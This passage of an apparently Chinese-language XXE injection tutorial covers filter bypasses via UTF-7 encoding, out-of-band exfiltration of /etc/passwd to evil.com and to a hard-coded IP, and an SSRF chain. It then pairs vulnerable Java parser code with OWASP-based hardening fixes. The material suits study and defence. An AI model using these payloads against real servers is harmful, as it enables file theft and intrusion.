&quot;test&quot;&apos;&gt;</span><br><span class="line">%local_dtd;</span><br></pre></td></tr></table></figure><p><strong>Custom Multi-Platform IBM WebSphere Application</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;./../../properties/schemas/j2ee/XMLSchema.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % xs-datatypes &apos;Your DTD code&apos;&gt;</span><br><span class="line">&lt;!ENTITY % simpleType &quot;a&quot;&gt;</span><br><span class="line">&lt;!ENTITY % restriction &quot;b&quot;&gt;</span><br><span class="line">&lt;!ENTITY % boolean &quot;(c)&quot;&gt;</span><br><span class="line">&lt;!ENTITY % URIref &quot;CDATA&quot;&gt;</span><br><span class="line">&lt;!ENTITY % XPathExpr &quot;CDATA&quot;&gt;</span><br><span class="line">&lt;!ENTITY % QName &quot;NMTOKEN&quot;&gt;</span><br><span class="line">&lt;!ENTITY % NCName &quot;NMTOKEN&quot;&gt;</span><br><span class="line">&lt;!ENTITY % nonNegativeInteger &quot;NMTOKEN&quot;&gt;</span><br><span class="line">%local_dtd;</span><br></pre></td></tr></table></figure><h2 id="协议绕过"><a href="#协议绕过" class="headerlink" title="协议绕过"></a>协议绕过</h2><table><thead><tr><th>libxml2</th><th>PHP</th><th>JAVA</th><th>.NET</th></tr></thead><tbody><tr><td>file<br>http<br>ftp</td><td>file<br>http<br>ftp<br>php<br>compress.zlib<br>compress.bzip2<br>data<br>glob<br>phar<br>expect</td><td>http<br>htps<br>ftp<br>file<br>jar<br>netdoc<br>mailto<br>gopher<br>csp</td><td>file<br>http<br>https<br>ftp</td></tr></tbody></table><ul><li><p>php协议解析<br>`&lt;!ENTITY % file SYSTEM “php://filter/read=convert.base64-encode/resource=file:///D:/test.txt”&gt;</p></li><li><p>php如果开了PECL上的Expect扩展<br><code>&lt;!ENTITY content SYSTEM &quot;expect://dir .&quot;&gt;</code></p></li><li><p>netdoc协议解析<br><code>&lt;!ENTITY file SYSTEM &quot;netdoc:///var/www/html&quot;&gt;</code></p></li><li><p>jar协议文件上传至临时目录</p><p>jar协议格式：<code>jar:{url}!{path}</code></p><ol><li>提供错误路径得到报错信息，临时文件目录地址<br>jar:<a href="http://127.0.0.1:2014/xxe.jar!/1.php(错误路径)" target="_blank" rel="noopener">http://127.0.0.1:2014/xxe.jar!/1.php(错误路径)</a></li><li>使用<a href="https://github.com/pwntester/BlockingServer" target="_blank" rel="noopener">延长返回web服务器</a>，上面存放需要上传的文件，上传后会阻塞住保持临时文件一直存在。</li><li>使用netdoc协议查看临时文件目录下生成的临时文件，获取临时文件名。</li><li>再进行其他操作。</li></ol></li></ul><blockquote><p>JDK1.6u35 、JDK1.7u7 之后开始恢复对于gopher方案的支持<br>libxml是PHP对xml的支持</p></blockquote><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><p>如果服务端存在关键词过滤（如ENTITY），可以使用utf-7编码绕过</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">  &lt;!ENTITY f SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span>&amp;f;<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure><p>转变编码形式为utf-7</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-7"</span> <span class="meta">?&gt;</span></span></span><br><span class="line">+ADwAIQ-DOCTYPE ANY +AFs-</span><br><span class="line">  +ADwAIQ-ENTITY f SYSTEM +ACI-file:///etc/passwd+ACIAPg-</span><br><span class="line">+AF0APg-</span><br><span class="line">+ADw-x+AD4AJg-f+ADsAPA-/x+AD4-</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-7"</span> <span class="meta">?&gt;</span></span></span><br><span class="line">+ADwAIQ-DOCTYPE xxe +AFs</span><br><span class="line">+ADwAIQ-ENTITY +ACU dtd SYSTEM +ACI-http://47.102.137.160:8090/xxe.dtd+ACIAPg</span><br><span class="line">+AF0APg</span><br><span class="line">+ADw-x+AD4AJg-f+ADsAPA-/x+AD4-</span><br></pre></td></tr></table></figure><h2 id="解决文件跨行传输——ftp-amp-jdk1-7"><a href="#解决文件跨行传输——ftp-amp-jdk1-7" class="headerlink" title="解决文件跨行传输——ftp&amp;jdk1.7+"></a>解决文件跨行传输——ftp&amp;jdk1.7+</h2><p>在XXE盲注中，我们也提到通过http协议访问我们的服务器会只获取被读取的文件第一行。</p><p>参考<a href="http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html" target="_blank" rel="noopener">XXE OOB exploitation at Java 1.7+</a>这篇文章，在特定情况下我们可以解决这种困境。</p><p>在jdk1.7以前，其实是可以通过http协议传输具有换行的文件的。因为java会对换行符进行URL编码然后就访问一个地址。</p><p>但是1.7之后，就修复了这个问题，会报错。</p><p>但是我们仍然可以用ftp服务器来接受换行文件，因为ftp没有进行类似的限制，换行之后的字符会被当做CWD命令输入。</p><p>只要起一个<a href="https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb" target="_blank" rel="noopener">恶意的FTP服务器</a>，其他按照正常的XXE盲注打就好了。</p><p><code>http://evil.com/ext.dtd</code></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">b</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % c "&lt;!ENTITY &amp;#37; rrr SYSTEM 'ftp://evil.com:8000/%b;'&gt;"&gt;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">   &lt;!ENTITY % asd SYSTEM "http://evil.com/ext.dtd"&gt; </span></span><br><span class="line"><span class="meta">   %asd; </span></span><br><span class="line"><span class="meta">   %rrr; </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最终效果大概如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">New client connected</span><br><span class="line">&lt; USER anonymous</span><br><span class="line">&lt; PASS Java1.7.0_45@</span><br><span class="line">&gt; 230 more data please!</span><br><span class="line">&lt; TYPE I</span><br><span class="line">&gt; 230 more data please!</span><br><span class="line">&lt; CWD root:x:0:0:root:</span><br><span class="line">&gt; 230 more data please!</span><br><span class="line">&lt; CWD root:</span><br></pre></td></tr></table></figure><p>发出的ftp:// url格式也可以使用username:password的形式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp://%b:password@evil.com:8000</span><br></pre></td></tr></table></figure><p>但是显而易见这要求<code>%b</code>这个文件内容中不包含<code>:</code>不然就会，格式报错。所以还是前者比较好</p><h2 id="JAVA组件特性列出目录"><a href="#JAVA组件特性列出目录" class="headerlink" title="JAVA组件特性列出目录"></a>JAVA组件特性列出目录</h2><p>网上试验，某些情况下可以通过JAVA组件的特性，来列出文件目录：</p><h4 id="盲注XEE-SSRF"><a href="#盲注XEE-SSRF" class="headerlink" title="盲注XEE+SSRF"></a>盲注XEE+SSRF</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % ext SYSTEM &quot;http://confluence.company.internal:8090/plugins/servlet/oauth/users/icon-uri?consumerUri=http://my_evil_site/evil.xml&quot;&gt;</span><br><span class="line">%ext;</span><br><span class="line">%ent;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;r&gt;&amp;data;&lt;/r&gt;</span><br></pre></td></tr></table></figure><p>evil.xml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///root&quot;&gt;</span><br><span class="line">&lt;!ENTITY % ent &quot;&lt;!ENTITY data SYSTEM &apos;:%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><h4 id="盲注XEE"><a href="#盲注XEE" class="headerlink" title="盲注XEE"></a>盲注XEE</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % one SYSTEM &quot;https://xxx.com/a.dtd&quot;&gt;</span><br><span class="line">%one;</span><br><span class="line">%two;</span><br><span class="line">%four;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>a.dtd：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % THREE STSTEM &quot;file:///&quot;&gt;</span><br><span class="line">&lt;!ENTITY % two &quot;&lt;!ENTITY &amp;#x25; four SYSTEM &apos;file:///%three;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>参考：</p><p><a href="https://www.anquanke.com/post/id/222679" target="_blank" rel="noopener">https://www.anquanke.com/post/id/222679</a></p><p><a href="https://honoki.net/2018/12/12/from-blind-xxe-to-root-level-file-read-access/" target="_blank" rel="noopener">https://honoki.net/2018/12/12/from-blind-xxe-to-root-level-file-read-access/</a></p><h2 id="JAVA组件案例"><a href="#JAVA组件案例" class="headerlink" title="JAVA组件案例"></a>JAVA组件案例</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">javax.xml.parsers.DocumentBuilderFactory;</span><br><span class="line">javax.xml.parsers.SAXParser</span><br><span class="line">javax.xml.transform.TransformerFactory</span><br><span class="line">javax.xml.validation.Validator</span><br><span class="line">javax.xml.validation.SchemaFactory</span><br><span class="line">javax.xml.transform.sax.SAXTransformerFactory</span><br><span class="line">javax.xml.transform.sax.SAXSource</span><br><span class="line">org.xml.sax.XMLReader</span><br><span class="line">DocumentHelper.parseText</span><br><span class="line">DocumentBuilder</span><br><span class="line">org.xml.sax.helpers.XMLReaderFactory</span><br><span class="line">org.dom4j.io.SAXReader</span><br><span class="line">org.jdom.input.SAXBuilder</span><br><span class="line">org.jdom2.input.SAXBuilder</span><br><span class="line">javax.xml.bind.Unmarshaller</span><br><span class="line">javax.xml.xpath.XpathExpression</span><br><span class="line">javax.xml.stream.XMLStreamReader</span><br><span class="line">org.apache.commons.digester3.Digester</span><br><span class="line">rg.xml.sax.SAXParseExceptionpublicId</span><br></pre></td></tr></table></figure><p>以下案例均取自参考。</p><p><a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#jaxb-unmarshaller" target="_blank" rel="noopener">https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#jaxb-unmarshaller</a></p><h3 id="0x01-DocumentBuilder"><a href="#0x01-DocumentBuilder" class="headerlink" title="0x01.DocumentBuilder"></a>0x01.DocumentBuilder</h3><p>java组件：javax.xml.parsers.*</p><p>组件漏洞代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception </span>&#123;</span><br><span class="line">    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">    DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">    String str = <span class="string">"&lt;!DOCTYPE doc [ \n"</span> +</span><br><span class="line">    <span class="string">"&lt;!ENTITY xxe SYSTEM \"http://127.0.0.1:8888\"&gt;\n"</span> +</span><br><span class="line">    <span class="string">"]&gt;&lt;doc&gt;&amp;xxe;&lt;/doc&gt;"</span>;</span><br><span class="line">    InputStream is = <span class="keyword">new</span> ByteArrayInputStream(str.getBytes());</span><br><span class="line">    Document doc = db.parse(is);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修复代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();     </span><br><span class="line"><span class="comment">/*以下为修复代码*/</span>            <span class="comment">//https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet#Java</span></span><br><span class="line"><span class="comment">//禁用DTDs (doctypes),几乎可以防御所有xml实体攻击</span></span><br><span class="line">dbf.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>); <span class="comment">//首选</span></span><br><span class="line"><span class="comment">//如果不能禁用DTDs,可以使用下两项，必须两项同时存在</span></span><br><span class="line">dbf.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);        <span class="comment">//防止外部实体POC </span></span><br><span class="line">dbf.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);   <span class="comment">//防止参数实体POC</span></span><br><span class="line"><span class="comment">/*以上为修复代码*/</span>    </span><br><span class="line">DocumentBuilder db = dbf.newDocumentBuilder();        </span><br><span class="line">Document doc = db.parse(request.getInputStream());</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">String FEATURE = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">FEATURE = <span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="keyword">true</span>);</span><br><span class="line"><span class="comment">// If you can't completely disable DTDs, then at least do the following:</span></span><br><span class="line"><span class="comment">// Xerces 1 - http://xerces.apache.org/xerces-j/features.html#external-general-entities</span></span><br><span class="line"><span class="comment">// Xerces 2 - http://xerces.apache.org/xerces2-j/features.html#external-general-entities</span></span><br><span class="line"><span class="comment">// JDK7+ - http://xml.org/sax/features/external-general-entities</span></span><br><span class="line">FEATURE = <span class="string">"http://xml.org/sax/features/external-general-entities"</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="keyword">false</span>);</span><br><span class="line"><span class="comment">// Xerces 1 - http://xerces.apache.org/xerces-j/features.html#external-parameter-entities</span></span><br><span class="line"><span class="comment">// Xerces 2 - http://xerces.apache.org/xerces2-j/features.html#external-parameter-entities</span></span><br><span class="line"><span class="comment">// JDK7+ - http://xml.org/sax/features/external-parameter-entities</span></span><br><span class="line">FEATURE = <span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="keyword">false</span>);</span><br><span class="line"><span class="comment">// Disable external DTDs as well</span></span><br><span class="line">FEATURE = <span class="string">"http://apache.org/xml/features/nonvalidating/load-external-dtd"</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="keyword">false</span>);</span><br><span class="line"><span class="comment">// and these as well, per Timothy Morgan's 2014 paper: "XML Schema, DTD, and Entity Attacks"</span></span><br><span class="line">dbf.setXIncludeAware(<span class="keyword">false</span>);</span><br><span class="line">dbf.setExpandEntityReferences(<span class="keyword">false</span>);</span><br><span class="line">&gt;..</span><br><span class="line"><span class="comment">// Load XML file or stream using a XXE agnostic configured parser...</span></span><br><span class="line">DocumentBuilder safebuilder = dbf.newDocumentBuilder();</span><br></pre></td></tr></table></figure><h3 id="0x02-SAXBuilder"><a href="#0x02-SAXBuilder" class="headerlink" title="0x02.SAXBuilder"></a>0x02.SAXBuilder</h3><p>java组件：org.jdom2.input.SAXBuilder</p><p>漏洞代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception </span>&#123;</span><br><span class="line">    String str = <span class="string">"&lt;!DOCTYPE doc [ \n"</span> +</span><br><span class="line">    <span class="string">"&lt;!ENTITY xxe SYSTEM \"http://127.0.0.1:8888\"&gt;\n"</span> +</span><br><span class="line">    <span class="string">"]&gt;&lt;doc&gt;&amp;xxe;&lt;/doc&gt;"</span>;</span><br><span class="line">    InputStream is = <span class="keyword">new</span> ByteArrayInputStream(str.getBytes());</span><br><span class="line">    SAXBuilder sb = <span class="keyword">new</span> SAXBuilder();</span><br><span class="line">    Document doc = sb.build(is);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修复代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SAXBuilder sb = <span class="keyword">new</span> SAXBuilder();</span><br><span class="line">sb.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">sb.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">sb.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">sb.setFeature(<span class="string">"http://apache.org/xml/features/nonvalidating/load-external-dtd"</span>, <span class="keyword">false</span>);</span><br><span class="line">Document doc = sb.build(is);</span><br></pre></td></tr></table></figure><h3 id="0x03-SAXParserFactory"><a href="#0x03-SAXParserFactory" class="headerlink" title="0x03.SAXParserFactory"></a>0x03.SAXParserFactory</h3><p>java组件：javax.xml.parsers.SAXParser / javax.xml.parsers.SAXParserFactory</p><p>漏洞代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception </span>&#123;</span><br><span class="line">    String str = <span class="string">"&lt;!DOCTYPE doc [ \n"</span> +</span><br><span class="line">    <span class="string">"&lt;!ENTITY xxe SYSTEM \"http://127.0.0.1:8888\"&gt;\n"</span> +</span><br><span class="line">    <span class="string">"]&gt;&lt;doc&gt;&amp;xxe;&lt;/doc&gt;"</span>;</span><br><span class="line">    InputStream is = <span class="keyword">new</span> ByteArrayInputStream(str.getBytes());</span><br><span class="line">    SAXParserFactory spf = SAXParserFactory.newInstance();</span><br><span class="line">    SAXParser parser = spf.newSAXParser();</span><br><span class="line">    parser.parse(is, (HandlerBase) <span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修复代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SAXParserFactory spf = SAXParserFactory.newInstance();</span><br><span class="line">spf.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">spf.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">spf.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">spf.setFeature(<span class="string">"http://apache.org/xml/features/nonvalidating/load-external-dtd"</span>, <span class="keyword">false</span>);</span><br><span class="line">SAXParser parser = spf.newSAXParser();</span><br></pre></td></tr></table></figure><h3 id="0x04-SAXTransformerFactory"><a href="#0x04-SAXTransformerFactory" class="headerlink" title="0x04.SAXTransformerFactory"></a>0x04.SAXTransformerFactory</h3><p>java组件：javax.xml.transform.sax.SAXTransformerFactory。</p><p>漏洞代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception </span>&#123;</span><br><span class="line">    String str = <span class="string">"&lt;!DOCTYPE doc [ \n"</span> +</span><br><span class="line">    <span class="string">"&lt;!ENTITY xxe SYSTEM \"http://127.0.0.1:8888\"&gt;\n"</span> +</span><br><span class="line">    <span class="string">"]&gt;&lt;doc&gt;&amp;xxe;&lt;/doc&gt;"</span>;</span><br><span class="line">    InputStream is = <span class="keyword">new</span> ByteArrayInputStream(str.getBytes());</span><br><span class="line">    SAXTransformerFactory sf = (SAXTransformerFactory) SAXTransformerFactory.newInstance();</span><br><span class="line">    StreamSource source = <span class="keyword">new</span> StreamSource(is);</span><br><span class="line">    sf.newTransformerHandler(source);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修复代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SAXTransformerFactory sf = (SAXTransformerFactory) SAXTransformerFactory.newInstance();</span><br><span class="line">sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">""</span>);</span><br><span class="line">sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, <span class="string">""</span>);</span><br><span class="line">StreamSource source = <span class="keyword">new</span> StreamSource(is);</span><br><span class="line">sf.newTransformerHandler(source);</span><br></pre></td></tr></table></figure><h3 id="0x05-SAXReader"><a href="#0x05-SAXReader" class="headerlink" title="0x05.SAXReader"></a>0x05.SAXReader</h3><p>java组件：org.dom4j.io.SAXReader</p><p>漏洞代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception </span>&#123;</span><br><span class="line">    String str = <span class="string">"&lt;!DOCTYPE doc [ \n"</span> +</span><br><span class="line">    <span class="string">"&lt;!ENTITY xxe SYSTEM \"http://127.0.0.1:8888\"&gt;\n"</span> +</span><br><span class="line">    <span class="string">"]&gt;&lt;doc&gt;&amp;xxe;&lt;/doc&gt;"</span>;</span><br><span class="line">    InputStream is = <span class="keyword">new</span> ByteArrayInputStream(str.getBytes());</span><br><span class="line">    SAXReader saxReader = <span class="keyword">new</span> SAXReader();</span><br><span class="line">    saxReader.read(is);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修复代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SAXReader saxReader = <span class="keyword">new</span> SAXReader();</span><br><span class="line">saxReader.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">saxReader.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">saxReader.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">saxReader.setFeature(<span class="string">"http://apache.org/xml/features/nonvalidating/load-external-dtd"</span>, <span class="keyword">false</span>);</span><br><span class="line">saxReader.read(is);</span><br></pre></td></tr></table></figure><h3 id="0x06-XMLReader"><a href="#0x06-XMLReader" class="headerlink" title="0x06.XMLReader"></a>0x06.XMLReader</h3><p>java组件：org.xml.sax.helpers.XMLReaderFactory</p><p>漏洞代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    String str = <span class="string">"&lt;!DOCTYPE doc [ \n"</span> +</span><br><span class="line">    <span class="string">"&lt;!ENTITY xxe SYSTEM \"http://127.0.0.1:8888\"&gt;\n"</span> +</span><br><span class="line">    <span class="string">"]&gt;&lt;doc&gt;&amp;xxe;&lt;/doc&gt;"</span>;</span><br><span class="line">    InputStream is = <span class="keyword">new</span> ByteArrayInputStream(str.getBytes());</span><br><span class="line">    XMLReader reader = XMLReaderFactory.createXMLReader();</span><br><span class="line">    reader.parse(<span class="keyword">new</span> InputSource(is));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修复代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">XMLReader reader = XMLReaderFactory.createXMLReader();</span><br><span class="line">reader.setFeature(<span 